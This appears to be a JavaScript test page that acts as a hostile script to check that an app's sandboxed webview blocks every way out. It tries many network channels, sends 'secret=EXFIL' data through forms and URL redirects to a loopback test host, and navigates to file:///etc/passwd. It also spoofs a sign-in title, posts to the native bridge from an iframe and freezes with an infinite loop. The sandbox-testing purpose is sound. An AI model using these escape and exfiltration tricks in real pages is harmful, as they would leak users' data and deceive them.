// The P4 hostile page: every exit the plan names, tried by a page that is allowed
// to run. Results go to Studio through vibe.run("probe", {msg}); the test reads
// them next to a loopback listener that must see nothing.
(async () => {
  const T = JSON.parse(document.getElementById('target').textContent), H = 'http://' + T, port = T.split(':')[1]
  const g = JSON.parse(document.getElementById('group').textContent)
  const buf = []
  const logEl = document.getElementById('log')
  // Each line is also shown in the page itself, so a person at the window can read the run.
  const log = (v, r) => { const line = v + '=' + String(r).slice(0, 160); buf.push(line); if (logEl) logEl.textContent += line + '\n' }
  const flush = async () => {
    if (!buf.length) return
    let msg = buf.splice(0).join(' | ')
    while (msg.length) {
      const part = msg.slice(0, 990); msg = msg.slice(990)
      try { await vibe.run('probe', { msg: part }) } catch (e) { /* rate limited: dropped */ }
    }
  }
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
  const tryit = async (v, f) => { try { log(v, 'ok ' + (await f())) } catch (e) { log(v, 'rejected ' + e) } }
  const add = (tag, attrs, parent) => { const e = document.createElement(tag); for (const k in attrs) e.setAttribute(k, attrs[k]); (parent || document.head).appendChild(e); return e }
  document.addEventListener('securitypolicyviolation', (e) => log('csp', e.violatedDirective + ' ' + e.blockedURI))
  log('env', JSON.stringify({ g, origin: location.origin, rtc: typeof RTCPeerConnection, md: typeof navigator.mediaDevices, handler: typeof (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.vibe), vibe: typeof vibe, use: String(await vibe.use('state')) }))
  log('params', JSON.stringify(Object.keys(vibe.params())))
  try { await vibe.run('nope', {}) } catch (e) { log('run-unknown', e.message) }

  if (g === 'main') {
    await tryit('fetch', async () => (await fetch(H + '/v/fetch')).status)
    await tryit('fetch-nocors', async () => (await fetch(H + '/v/fetch-nocors', { mode: 'no-cors' })).type)
    await tryit('fetch-self-asset', async () => (await fetch('assets/x.json')).status)
    await tryit('fetch-dnsname', async () => (await fetch('http://fetch-name.spike.test:' + port + '/v/dns-fetch', { mode: 'no-cors' })).type)
    await tryit('xhr', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', H + '/v/xhr'); x.onload = () => res(x.status); x.onerror = () => rej('xhr error'); x.send() }))
    try { const w = new WebSocket('ws://' + T + '/v/ws'); w.onerror = () => log('ws', 'error'); w.onopen = () => log('ws', 'open') } catch (e) { log('ws', 'throw ' + e) }
    try { const es = new EventSource(H + '/v/eventsource'); es.onerror = () => { log('eventsource', 'error'); es.close() } } catch (e) { log('eventsource', 'throw ' + e) }
    try { log('beacon', navigator.sendBeacon(H + '/v/beacon', 'x')) } catch (e) { log('beacon', 'throw ' + e) }
    new Image().src = H + '/v/img'
    new Image().src = 'http://img-name.spike.test:' + port + '/v/dns-img'
    add('style', {}).textContent = '@import url(' + H + '/v/css-import.css); body{background:url(' + H + '/v/css-url)} @font-face{font-family:x;src:url(' + H + '/v/css-font)} p{font-family:x}'
    add('link', { rel: 'dns-prefetch', href: 'http://pf-dns.spike.test:' + port + '/' })
    add('link', { rel: 'preconnect', href: H })
    add('link', { rel: 'preconnect', href: 'http://pc-name.spike.test:' + port })
    add('link', { rel: 'prefetch', href: H + '/v/prefetch' })
    add('link', { rel: 'preload', as: 'fetch', href: H + '/v/preload' })
    add('link', { rel: 'prerender', href: H + '/v/prerender' })
    add('link', { rel: 'stylesheet', href: H + '/v/link-css.css' })
    add('link', { rel: 'icon', href: H + '/v/icon' })
    const a = add('a', { href: '#frag', ping: H + '/v/ping' }, document.body); a.textContent = 'x'; a.click()
    add('script', { src: H + '/v/script.js' }, document.body)
    try { const b = new Blob(['fetch("' + H + '/v/worker-fetch").catch(()=>{});try{importScripts("' + H + '/v/worker-import.js")}catch(e){}'], { type: 'text/javascript' }); new Worker(URL.createObjectURL(b)); log('worker', 'started') } catch (e) { log('worker', 'throw ' + e) }
    if (typeof RTCPeerConnection !== 'undefined') {
      try { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:' + T }] }); pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer()); log('webrtc', 'offer set') } catch (e) { log('webrtc', 'throw ' + e) }
    } else log('webrtc', 'RTCPeerConnection undefined')
    try { await navigator.mediaDevices.getUserMedia({ audio: true }); log('getUserMedia', 'granted') } catch (e) { log('getUserMedia', 'rejected ' + e) }
    try { log('notification', await Notification.requestPermission()) } catch (e) { log('notification', 'throw ' + e) }
    try { navigator.geolocation.getCurrentPosition(() => log('geolocation', 'granted'), (e) => log('geolocation', 'denied ' + e.code)) } catch (e) { log('geolocation', 'throw ' + e) }
    try { log('clipboard', await navigator.clipboard.readText()) } catch (e) { log('clipboard', 'rejected ' + e) }
    try { await document.documentElement.requestFullscreen(); log('fullscreen', 'granted') } catch (e) { log('fullscreen', 'rejected ' + e) }
    try { log('alert', String(alert('x'))); log('confirm', String(confirm('x'))); log('prompt', String(prompt('x'))) } catch (e) { log('dialogs', 'throw ' + e) }
    await sleep(4000)
    log('main', 'done')
  } else if (g === 'open') {
    const w = window.open(H + '/v/window-open'); log('window.open', w === null ? 'null' : 'window')
    const w2 = window.open('vibe-page://' + location.host + '/?group=main'); log('window.open-self', w2 === null ? 'null' : 'window')
    add('a', { href: H + '/v/target-blank', target: '_blank' }, document.body).click()
    await sleep(2000); log('open', 'done')
  } else if (g === 'form') {
    for (const method of ['POST', 'GET']) {
      const f = add('form', { action: H + '/v/form-' + method, method }, document.body); add('input', { name: 'secret', value: 'EXFIL' }, f)
      log('form-' + method, 'submitting'); f.submit(); await sleep(1500)
    }
    log('form', 'still here')
  } else if (g === 'loc') {
    log('loc', 'assigning'); location = H + '/v/location?secret=EXFIL'; await sleep(1500)
    location.replace(H + '/v/locreplace'); await sleep(1500)
    location.href = 'http://loc-name.spike.test:' + port + '/v/locname'; await sleep(1500)
    log('loc', 'still here')
  } else if (g === 'alink') {
    // A script-clicked link to an IP address: the one accepted macOS leak (#189).
    add('a', { href: H + '/v/alink' }, document.body).click(); await sleep(1500)
    log('alink', 'still here')
  } else if (g === 'alinkname') {
    add('a', { href: 'http://alink-name-' + Date.now() + '.spike.test:' + port + '/v/alinkname' }, document.body).click(); await sleep(1500)
    add('a', { href: 'https://alink-sname-' + Date.now() + '.spike.test:' + port + '/v/alinksname' }, document.body).click(); await sleep(1500)
    log('alinkname', 'still here')
  } else if (g === 'alinkhttps') {
    add('a', { href: 'https://' + T + '/v/alink-https' }, document.body).click(); await sleep(1500)
    log('alinkhttps', 'still here')
  } else if (g === 'metarefresh') {
    add('meta', { 'http-equiv': 'refresh', content: '0;url=' + H + '/v/metarefresh' }); await sleep(2000); log('metarefresh', 'still here')
  } else if (g === 'selfnav') {
    for (const href of ['other?x=1', 'about:blank', 'javascript:window.__js=1', 'blob:vibe-page://probe/x', 'data:text/html,<p>x', 'file:///etc/passwd']) {
      add('a', { href }, document.body).click(); await sleep(700); log('nav ' + href.slice(0, 20), 'still here js=' + window.__js); await flush()
    }
    add('a', { href: '?group=samepage' }, document.body).click(); await sleep(2000)
  } else if (g === 'samepage') {
    log('samepage', 'arrived'); await sleep(800)
  } else if (g === 'frame') {
    const f1 = add('iframe', { srcdoc: '<script>try{window.webkit.messageHandlers.vibe.postMessage(JSON.stringify({t:"run",id:1,q:"probe",v:{msg:"posted-from-srcdoc"}}))}catch(e){}<\/script>' }, document.body)
    const f2 = add('iframe', { src: 'assets/frame.html' }, document.body)
    await sleep(2500); log('frame', 'done ' + f1.contentWindow + f2.contentWindow)
  } else if (g === 'freeze') {
    await flush(); await sleep(1500); log('freeze', 'entering'); await flush(); while (true) {}
  } else if (g === 'title') {
    document.title = 'Vibe Studio - Sign in'; await sleep(1000); log('title', document.title)
  } else if (g === 'storage') {
    const prev = { ls: null, ck: document.cookie }
    try { prev.ls = localStorage.getItem('k'); localStorage.setItem('k', 'v1') } catch (e) { prev.ls = 'throw ' + e }
    try { document.cookie = 'c=1; path=/' } catch (e) {}
    let idb = 'n/a'; try { idb = await new Promise((res) => { const r = indexedDB.open('spike'); r.onsuccess = () => { res('opened'); r.result.close() }; r.onerror = () => res('idb error') }) } catch (e) { idb = 'throw ' + e }
    log('storage', JSON.stringify({ prevLocalStorage: prev.ls, prevCookie: prev.ck, idb }))
  } else if (g === 'charts') {
    try {
      const x = d3.scaleLinear().domain([0, 4]).range([10, 290]), y = d3.scaleLinear().domain([0, 10]).range([110, 10])
      const d = d3.line().x((v, i) => x(i)).y((v) => y(v))([3, 7, 2, 9, 5])
      document.getElementById('out').insertAdjacentHTML('beforeend', '<svg id="d3svg" width="300" height="120"><path d="' + d + '"/></svg>')
      log('d3', 'path length ' + document.querySelector('#d3svg path').getAttribute('d').length)
    } catch (e) { log('d3', 'FAIL ' + e) }
    try {
      if (window.vega && window.vegaInterpreter && !window.vega.expressionInterpreter) window.vega.expressionInterpreter = window.vegaInterpreter.expressionInterpreter
      const vl = { data: { values: [{ a: 'A', b: 28 }, { a: 'B', b: 55 }, { a: 'C', b: 43 }] }, mark: 'bar', encoding: { x: { field: 'a', type: 'nominal' }, y: { field: 'b', type: 'quantitative' } } }
      const view = new vega.View(vega.parse(vegaLite.compile(vl).spec, null, { ast: true }), { expr: vega.expressionInterpreter, renderer: 'none' })
      const svg = await view.toSVG()
      document.getElementById('out').insertAdjacentHTML('beforeend', svg)
      log('vega-lite', 'svg bytes ' + svg.length)
    } catch (e) { log('vega-lite', 'FAIL ' + e) }
  }
  await flush()
  setInterval(flush, 400)
})()
